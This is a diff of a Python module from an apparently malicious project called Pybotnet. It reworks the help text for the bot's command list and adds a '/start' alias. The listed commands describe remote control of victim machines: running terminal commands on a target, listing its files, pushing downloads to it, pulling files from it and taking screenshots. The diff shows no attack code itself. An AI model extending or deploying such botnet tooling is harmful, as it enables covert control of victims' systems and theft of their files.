@@ -15,15 +15,25 @@ from . import settings
 mac_addres = str(get_system_mac_addres())
 
 scripts_name = {
-    mac_addres: "<system mac_addres> <command>",
-    "do_sleep": "do_sleep <scconds> <message>",
-    "get_info": "get_info",
-    "cmd": "cmd <command>",
-    "ls": "ls <route>",
-    "export_file": "export_file <download link>",
-    "import_file": "import_file <file route>",
-    "screenshot":  "screenshot",
-    "help": "help"
+    mac_addres: "`<system mac_addres> <command>`: run command on one target",
+
+    "do_sleep": "`do_sleep <scconds> <message>`: print message and sleep",
+
+    "get_info": "`get_info`: get target info",
+
+    "cmd": "`cmd <command>`: run command in target terminal",
+
+    "ls": "`ls <route>`: Return a list of folders and files in that path",
+
+    "export_file": "`export_file <download link>`: target donwload this file and save to script path",
+
+    "import_file": "`import_file <file route>`: get a file from target system",
+
+    "screenshot":  "`screenshot`: Takes a screenshot, return the download link",
+
+    "help": "`help`: send this message",
+
+    "/start": "`/start`: run `help` command!"
 }
 
 # "import_file": "import_file <route>"
@@ -77,7 +87,8 @@ def execute_scripts(command: str, pybotnet_up_time, is_shell: bool, logger):
 
             elif command_name == 'screenshot':
                 return screenshot(logger)
-            elif command_name == 'help':
+
+            elif command_name in ['help', '/start']:
                 return command_help(logger)
 
         logger.error('execute_scripts invalid command; Wrong format')
@@ -339,21 +350,20 @@ def command_help(logger):
     commands = ''
     try:
         for _, value in scripts_name.items():
-            commands += '\n|' + value
+            commands += '\n\n|' + value
         logger.info(f'scripts.command_help: return command lists')
-        return f'''
-
+        return f'''command list:
 {commands}
 
-Pybotnet Version:{settings.pybotnet_version}
-for more help, see: {settings.pybotnet_github_link}'''
+Version: {settings.pybotnet_version}
+more help: {settings.pybotnet_github_link}'''
 
     except Exception as error:
         logger(f'scripts.command_help: error {error}')
         return f'''
-Pybotnet Version:{settings.pybotnet_version}
 _____________
 get command list failed!,
 _____________
 
+Pybotnet Version:{settings.pybotnet_version}
 for more help, see: {settings.pybotnet_github_link}'''
